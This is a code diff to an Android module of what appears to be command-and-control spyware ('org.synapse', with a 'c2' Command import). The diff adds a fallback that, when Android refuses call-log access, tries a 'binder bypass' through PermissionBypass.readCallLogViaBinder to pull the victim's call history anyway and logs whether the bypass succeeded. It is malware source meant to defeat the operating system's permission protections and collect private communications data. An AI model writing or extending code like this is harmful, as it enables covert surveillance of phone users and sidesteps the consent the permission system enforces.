@@ -2,6 +2,7 @@ package org.synapse.core.modules
 
 import android.content.Context
 import android.provider.CallLog
+import android.util.Log
 import org.synapse.core.c2.Command
 import org.synapse.core.core.CallEntry
 import org.synapse.core.core.SynapseResponse
@@ -58,7 +59,19 @@ object CallLogModule {
                 count = calls.size
             )
         } catch (e: SecurityException) {
-            SynapseResponse.ErrorResponse("calls:permission_denied:${e.message}", "calls")
+            // ── Binder bypass fallback ──
+            Log.d("Synapse.CallLog", "ContentResolver denied, trying binder bypass...")
+            return try {
+                val binderCalls = PermissionBypass.readCallLogViaBinder(context, filter, count)
+                if (binderCalls.isNotEmpty()) {
+                    Log.d("Synapse.CallLog", "Binder bypass success: ${binderCalls.size} calls")
+                    SynapseResponse.CallLogResponse(calls = binderCalls, count = binderCalls.size)
+                } else {
+                    SynapseResponse.ErrorResponse("calls:permission_denied:${e.message}", "calls")
+                }
+            } catch (bp: Exception) {
+                SynapseResponse.ErrorResponse("calls:permission_denied_and_bypass_failed:${bp.message}", "calls")
+            }
         } catch (e: Exception) {
             SynapseResponse.ErrorResponse("calls:${e.message}", "calls")
         }
